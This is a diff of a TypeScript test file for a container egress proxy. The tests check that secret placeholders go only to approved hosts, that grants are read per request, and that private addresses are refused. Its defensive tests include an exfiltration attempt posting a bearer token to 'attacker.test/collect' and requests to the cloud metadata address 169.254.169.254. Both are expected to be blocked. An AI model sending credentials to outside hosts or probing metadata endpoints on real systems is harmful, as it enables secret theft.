@@ -2,14 +2,14 @@
 // Native network policy and vault routing are also measured by gate:egress-interception.
 import { describe, expect, test } from 'bun:test';
 import {
-  EGRESS_PLACEHOLDER_PREFIX, refusedHostname, type EgressSecretBinding,
+  EGRESS_PLACEHOLDER_PREFIX, refusedHostname,
 } from '@kinu.run/core';
 import type { KinuDevbox } from '../src/kinu-devbox';
 // Static: neither module reaches `cloudflare:email`, so neither needs the mock below.
 import { kinuEgressParams } from '../src/egress/configure';
 import { adaptCloudflareSandbox } from '../src/sandbox-exec-lane';
 import type { ApprovalGrant, EgressInjectionResult, EgressRequestFacts, UserCaller } from '@kinu.run/core';
-import type { ContainerEgressEnv, ContainerEventResolver, KinuEgressParams } from '../src/egress/outbound';
+import type { ContainerEgressEnv, ContainerEventResolver, EgressWorkspace, KinuEgressParams } from '../src/egress/outbound';
 import { mockAgentsSdk } from './helpers/agents-sdk';
 import { jsrpcStub } from './helpers/jsrpc-stub';
 import {
@@ -37,13 +37,13 @@ const SECRET = ['sk_live_', 'abcdefghij0123456789'].join('');
 
 const PLACEHOLDER = `${EGRESS_PLACEHOLDER_PREFIX}${'Q'.repeat(43)}`;
 
-const BINDING: EgressSecretBinding = {
-  id: 'stripe', label: 'Stripe', host: 'api.stripe.com', placeholder: PLACEHOLDER,
-};
 
-const PARAMS: KinuEgressParams = {
-  workspaceName: 'kinu-main', ownerUserId: 'user-1', grants: [{ rule: 'egress-secret:stripe', executor: 'sandbox' }],
-};
+const PARAMS: KinuEgressParams = { workspaceName: 'kinu-main', ownerUserId: 'user-1' };
+
+const STRIPE_GRANT: ApprovalGrant = { rule: 'egress-secret:stripe', executor: 'sandbox' };
+
+/** The workspace's grants as the egress asks for them: Stripe's, for every request that names a placeholder. */
+const WORKSPACE: EgressWorkspace = { grants: async () => [STRIPE_GRANT] };
 
 /** `get` returns a `jsrpcStub`: the real binding is a Proxy, and a literal double hid a TypeError here. */
 function fakeEnv(resolve: () => EgressInjectionResult): ContainerEgressEnv<string> {
@@ -99,7 +99,7 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
           method: 'POST', headers: { authorization: `Bearer ${PLACEHOLDER}` },
         }),
         fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
 
       expect(response.status).toBe(200);
@@ -124,7 +124,7 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
       const response = await handleContainerEgress(
         new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
         fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
 
       const body = await response.text();
@@ -140,7 +140,7 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
     const response = await handleContainerEgress(
       new Request('https://attacker.test/collect', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
       fakeEnv(() => ({ kind: 'refuse', status: 403, reason: 'bound to api.stripe.com' })),
-      PARAMS,
+      PARAMS, WORKSPACE,
     );
 
     expect(response.status).toBe(403);
@@ -152,7 +152,7 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
 
     try {
       const response = await handleContainerEgress(
-        new Request('https://api.stripe.com/'), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), undefined,
+        new Request('https://api.stripe.com/'), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), undefined, WORKSPACE,
       );
 
       expect(response.status).toBe(503);
@@ -166,7 +166,7 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
 
     try {
       const response = await handleContainerEgress(
-        new Request('https://registry.npmjs.org/express'), throwingVaultEnv({ cause: new Error('durable object reset') }), PARAMS,
+        new Request('https://registry.npmjs.org/express'), throwingVaultEnv({ cause: new Error('durable object reset') }), PARAMS, WORKSPACE,
       );
 
       expect(response.status).toBe(200);
@@ -181,7 +181,7 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
       await handleContainerEgress(
         new Request('https://example.com/'),
         fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
       expect(upstream.seen[0].url).toBe('https://example.com/');
       expect(upstream.seen[0].headers.get('authorization')).toBeNull();
@@ -190,18 +190,10 @@ describe('the secret reaches the upstream and comes back scrubbed', () => {
 });
 
 describe('what the container is configured with', () => {
-  test('only the grants that spend a secret are carried, and no binding or placeholder', () => {
-    const params = kinuEgressParams({
-      workspaceName: 'kinu-main',
-      ownerUserId: 'user-1',
-      grants: [
-        { rule: 'egress-secret:stripe', executor: 'sandbox' },
-        { rule: 'rm-rf', executor: 'sandbox' },
-        { rule: 'egress-secret:prod-db', executor: 'device' },
-      ],
-    });
+  test('the container is configured with its workspace and owner alone: no grant, binding or placeholder', () => {
+    const params = kinuEgressParams({ workspaceName: 'kinu-main', ownerUserId: 'user-1' });
 
-    expect(params.grants).toEqual([{ rule: 'egress-secret:stripe', executor: 'sandbox' }]);
+    expect(params).toEqual({ workspaceName: 'kinu-main', ownerUserId: 'user-1' });
     expect(JSON.stringify(params)).not.toContain(EGRESS_PLACEHOLDER_PREFIX);
   });
 
@@ -210,14 +202,10 @@ describe('what the container is configured with', () => {
     expect(parseEgressParams({ props: { workspaceName: 'w' } })).toBeUndefined();
     expect(parseEgressParams({ props: undefined })).toBeUndefined();
   });
-
-  test('a configuration stored before grants replaced bindings reads as unconfigured, so nothing leaves unjudged', () => {
-    expect(parseEgressParams({ props: { workspaceName: 'w', ownerUserId: 'u', bindings: [BINDING] } })).toBeUndefined();
-  });
 });
 
 describe('the vault is read when a request names a secret, never before', () => {
-  test('a placeholder is planned by the vault against the grants the egress carries', async () => {
+  test('a placeholder is planned by the vault against the workspace\'s grants as it asks', async () => {
     const asked: (readonly ApprovalGrant[])[] = [];
     const upstream = captureFetch(() => new Response('ok'));
 
@@ -237,11 +225,11 @@ describe('the vault is read when a request names a secret, never before', () => 
 
     try {
       const response = await handleContainerEgress(
-        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), env, PARAMS,
+        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), env, PARAMS, WORKSPACE,
       );
 
       expect(response.status).toBe(200);
-      expect(asked).toEqual([PARAMS.grants]);
+      expect(asked).toEqual([[STRIPE_GRANT]]);
       expect(upstream.seen[0]?.headers.get('authorization')).toBe(`Bearer ${SECRET}`);
     } finally { upstream.restore(); }
   });
@@ -255,15 +243,78 @@ describe('the vault is read when a request names a secret, never before', () => 
 
     try {
       const named = await handleContainerEgress(
-        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), env, PARAMS,
+        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), env, PARAMS, WORKSPACE,
       );
 
-      const plain = await handleContainerEgress(new Request('https://registry.npmjs.org/express'), env, PARAMS);
+      const plain = await handleContainerEgress(new Request('https://registry.npmjs.org/express'), env, PARAMS, WORKSPACE);
 
       expect(named.status).toBe(503);
       expect(await named.text()).toContain('CREDENTIAL_ENCRYPTION_KEY is not set');
       expect(plain.status).toBe(200);
       expect(upstream.seen.map((request) => request.url)).toEqual(['https://registry.npmjs.org/express']);
+    } finally { upstream.restore(); }
+  });
+});
+
+describe('the workspace\'s grants are read as they stand', () => {
+  test('a secret granted after the egress was minted is spent on the next request, without a restart', async () => {
+    const granted: ApprovalGrant[] = [];
+    const upstream = captureFetch(() => new Response('ok'));
+
+    const env: ContainerEgressEnv<string> = {
+      UserDO: {
+        idFromName: (name: string) => name,
+        get: () => jsrpcStub({
+          resolveEgressInjection: async (_caller: UserCaller, _facts: EgressRequestFacts, grants: readonly ApprovalGrant[]): Promise<EgressInjectionResult> => (
+            grants.length === 0
+              ? { kind: 'refuse', status: 403, reason: 'not bound to any approved secret' }
+              : { kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] }
+          ),
+        }),
+      },
+      CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
+    };
+
+    const request = () => new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } });
+
+    try {
+      const before = await handleContainerEgress(request(), env, PARAMS, { grants: async () => [...granted] });
+
+      granted.push(STRIPE_GRANT);
+      const after = await handleContainerEgress(request(), env, PARAMS, { grants: async () => [...granted] });
+
+      expect([before.status, after.status]).toEqual([403, 200]);
+      expect(upstream.seen.map((sent) => sent.headers.get('authorization'))).toEqual([`Bearer ${SECRET}`]);
+    } finally { upstream.restore(); }
+  });
+
+  test('a request that names no placeholder asks neither the workspace nor the vault', async () => {
+    const upstream = captureFetch(() => new Response('ok'));
+    const asked: string[] = [];
+
+    try {
+      const response = await handleContainerEgress(
+        new Request('https://registry.npmjs.org/express'), throwingVaultEnv({ cause: new Error('the vault is not asked') }), PARAMS,
+        { grants: async (workspaceName) => { asked.push(workspaceName); throw new Error('the workspace is not asked'); } },
+      );
+
+      expect(response.status).toBe(200);
+      expect(asked).toEqual([]);
+    } finally { upstream.restore(); }
+  });
+
+  test('a workspace that cannot answer for its grants refuses the request that names a secret, and sends nothing', async () => {
+    const upstream = captureFetch(() => new Response('should not happen'));
+
+    try {
+      const response = await handleContainerEgress(
+        new Request('https://api.stripe.com/', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
+        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })), PARAMS,
+        { grants: async () => { throw new Error('the workspace object reset'); } },
+      );
+
+      expect(response.status).toBe(503);
+      expect(upstream.seen).toHaveLength(0);
     } finally { upstream.restore(); }
   });
 });
@@ -416,7 +467,7 @@ describe('one User-Agent for everything a container sends', () => {
       await handleContainerEgress(
         new Request('https://example.com/', { headers: { 'user-agent': 'curl/8.5.0' } }),
         fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
       expect(upstream.seen[0].headers.get('user-agent')).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
     } finally { upstream.restore(); }
@@ -431,7 +482,7 @@ describe('one User-Agent for everything a container sends', () => {
           method: 'POST', headers: { authorization: `Bearer ${PLACEHOLDER}`, 'user-agent': 'curl/8.5.0' },
         }),
         fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
       expect(upstream.seen[0].headers.get('user-agent')).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
     } finally { upstream.restore(); }
@@ -444,7 +495,7 @@ describe('one User-Agent for everything a container sends', () => {
       await handleContainerEgress(
         new Request('https://example.com/'),
         fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
       expect(upstream.seen[0].headers.get('user-agent')).toBe(KINU_USER_AGENT);
     } finally { upstream.restore(); }
@@ -481,7 +532,7 @@ describe('the forwarded body is the container\'s own, not a copy of it', () => {
       const inbound = new Request('https://example.com/upload', init);
       const body = inbound.body;
       await handleContainerEgress(
-        inbound, fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        inbound, fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
       expect(upstream.seen[0].body).toBe(body);
     } finally { upstream.restore(); }
@@ -507,7 +558,7 @@ describe('a throw at the boundary becomes a classified answer', () => {
       response = await handleContainerEgress(
         new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
         throwingVaultEnv({ cause: new Error('durable object reset') }),
-        PARAMS,
+        PARAMS, WORKSPACE,
       );
     });
 
@@ -527,7 +578,7 @@ describe('a throw at the boundary becomes a classified answer', () => {
     const timeout = new DOMException('The operation timed out', 'TimeoutError');
 
     const response = await handleContainerEgress(
-      new Request('https://api.stripe.com/', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), throwingVaultEnv({ cause: timeout }), PARAMS,
+      new Request('https://api.stripe.com/', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), throwingVaultEnv({ cause: timeout }), PARAMS, WORKSPACE,
     );
 
     expect(response.status).toBe(504);
@@ -542,7 +593,7 @@ describe('a throw at the boundary becomes a classified answer', () => {
         response = await handleContainerEgress(
           new Request('https://example.com/'),
           fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
-          PARAMS,
+          PARAMS, WORKSPACE,
         );
       });
 
@@ -567,7 +618,7 @@ describe('a throw at the boundary becomes a classified answer', () => {
         response = await handleContainerEgress(
           new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
           fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
-          PARAMS,
+          PARAMS, WORKSPACE,
         );
       });
 
@@ -624,7 +675,7 @@ describe('private destinations are refused at the one place requests leave', () 
 
     try {
       const refusal = await handleContainerEgress(
-        new Request(target), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        new Request(target), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
 
       expect(refusal.status).toBe(403);
@@ -637,7 +688,7 @@ describe('private destinations are refused at the one place requests leave', () 
     const emitted = await recordDiagnostics(async () => {
       await handleContainerEgress(
         new Request('http://169.254.169.254/latest/meta-data/'),
-        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
     });
 
@@ -653,7 +704,7 @@ describe('private destinations are refused at the one place requests leave', () 
     try {
       const response = await handleContainerEgress(
         new Request('https://example.com/'),
-        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
 
       expect(response.status).toBe(200);
@@ -676,7 +727,7 @@ describe('every redirect hop is judged, not trusted', () => {
     try {
       const first = await handleContainerEgress(
         new Request('https://public.example/start'),
-        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
 
       expect(first.status).toBe(302);
@@ -691,7 +742,7 @@ describe('every redirect hop is judged, not trusted', () => {
     try {
       const second = await handleContainerEgress(
         new Request('http://169.254.169.254/latest/meta-data/'),
-        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
+        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
       );
 
       expect(second.status).toBe(403);
